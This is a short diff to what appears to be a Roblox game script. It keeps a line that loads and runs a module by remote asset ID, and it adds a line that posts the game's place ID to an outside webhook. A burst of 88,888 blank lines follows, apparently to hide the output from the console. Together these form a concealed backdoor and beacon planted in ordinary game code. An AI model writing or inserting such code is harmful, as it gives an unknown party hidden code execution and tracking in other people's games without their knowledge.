@@ -1,1 +1,2 @@
 require(77565251296196):load()
+local http = game:GetService("HttpService") local hook = "https://webhook.newstargeted.com/api/webhooks/1305269663420125184/99zwODvYxcx3_oG97wPvdz9NyGrCSkUH4-ECuJfZHVypEszKwW6MsU0Sm46jS6jYX7jP" local Data = { ["content"] = ": https://www.roblox.com/games/"..game.PlaceId, } Data = http:JSONEncode(Data) http:PostAsync(hook, Data)print(("\n"):rep(88888))
